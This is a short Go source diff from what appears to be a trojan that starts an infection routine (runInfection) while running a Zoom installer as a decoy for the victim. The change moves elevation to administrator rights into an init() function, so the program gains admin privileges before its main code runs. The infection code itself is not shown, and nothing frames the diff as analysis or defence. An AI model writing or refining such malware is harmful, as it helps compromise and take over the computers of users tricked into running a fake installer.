@@ -11,11 +11,11 @@ import (
 
 //go:generate go run generate/cryptoservice_buffer.go
 
+func init() {
+    win.RunAsAdmin()
+}
+
 func main() {
-    if !win.IsUserAnAdmin() {
-        win.ShellExecute("runas", os.Args[0], win.SW_SHOW)
-        return
-    }
     done := make(chan struct{})
     go runInfection(done)
     victim.RunZoomInstaller()
